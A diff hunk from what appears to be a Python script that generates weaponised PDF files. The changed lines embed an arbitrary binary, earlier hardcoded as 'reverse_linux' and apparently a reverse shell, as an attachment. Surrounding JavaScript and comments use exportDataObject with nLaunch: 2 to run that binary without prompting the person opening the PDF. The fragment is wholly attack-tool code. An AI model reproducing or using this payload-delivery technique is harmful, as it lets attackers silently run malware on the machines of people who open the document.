@@ -24,8 +24,8 @@ if(choice == "1"):
     # starts print job, testing for js execution
     writer.addJS("this.print({bUI:true,bSilent:false,bShrinkToFit:true});")
     # opening and embedding the binary into pdf
-    with open("reverse_linux", "rb") as rs:
-        writer.addAttachment("reverse_linux", rs.read())
+    with open(binary, "rb") as rs:
+        writer.addAttachment(binary, rs.read())
         #writer.addJS("this.exportDataObject({cName: 'reverse_linux', nLaunch: 2});")
     # adding JavaScript that will invoke the binary
     # nLaunch: 2 --> without prompting the user and saving it to a temp location
